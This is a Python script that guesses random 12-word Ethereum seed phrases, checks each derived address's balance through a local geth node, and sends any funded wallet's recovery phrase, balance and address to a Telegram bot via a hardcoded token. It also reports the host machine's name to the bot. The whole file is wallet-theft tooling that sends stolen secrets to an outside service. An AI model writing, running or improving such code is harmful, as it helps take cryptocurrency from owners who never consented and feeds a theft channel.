import time
import multiprocessing
import requests
import random
import eth_utils.exceptions
from web3 import Web3
from eth_account import Account
import socket
import subprocess

# Visit https://t.me/BotFather to get your bot Token.
Token = '8765498435:AAEwPQedsnMyJCLY3yteBMtmxqIj-AoOd5A'

# Visit https://web.telegram.org/k/ to get your group ID.
chat_id = -1866928477

# If your Telegram group is a supergroup, add -100 to the ID name.
    # Example: -1001866928477

subprocess.Popen('geth')
time.sleep(2)

Account.enable_unaudited_hdwallet_features()
web3 = Web3()
print("Is connected? " + str(web3.isConnected()))

with open("words.txt", "r") as f:
    a = f.readlines()

word = []
for l in a:
    if len(l) != 1:
        word.append(l[:len(l) - 1])

b = 12
phrase = []

def send_to_telegram(message):

    apiToken = Token
    apiURL = f'https://api.telegram.org/bot{apiToken}/sendMessage'

    try:
        response = requests.post(apiURL, json={'chat_id': chat_id, 'text': message})
        # print(response.text)
    except Exception as e:
        print(e)

def multiprocessing_func(WORKER):
    checked = 0
    while True:

        try:
            w = word.copy()
            l = []
            for i in range(int(b)):
                s = random.choice(w)
                w.remove(s)
                l.append(s)
            phrase = " ".join(l)
            try:
                addr = Account.from_mnemonic(phrase).address
                bal = float(web3.eth.get_balance(addr))

                if float(bal) > 0.0:
                    send_to_telegram((f"[+] Success:\n{phrase}\n{bal}\n{addr}"))
                    break
                else:
                    checked += 1
                    print(f"Worker: {WORKER} Checked: {checked} [-] EMPTY {phrase} : {bal} : {addr}")
                    pass

            except eth_utils.exceptions.ValidationError:
                pass

        except KeyboardInterrupt:
            break
    
if __name__ == '__main__':
    send_to_telegram(f"I have been assigned by a virtual computer. I will post the wallet information here in case of a possible wallet match.\n\nComputer I am connected to: {socket.gethostname()}")
    processes = []
    print('Processor spreading..')
    while True:
        for i in range(0,3):
            p = multiprocessing.Process(target=multiprocessing_func, args=(i,))
            processes.append(p)
            p.start()
        
        for process in processes:
            process.join()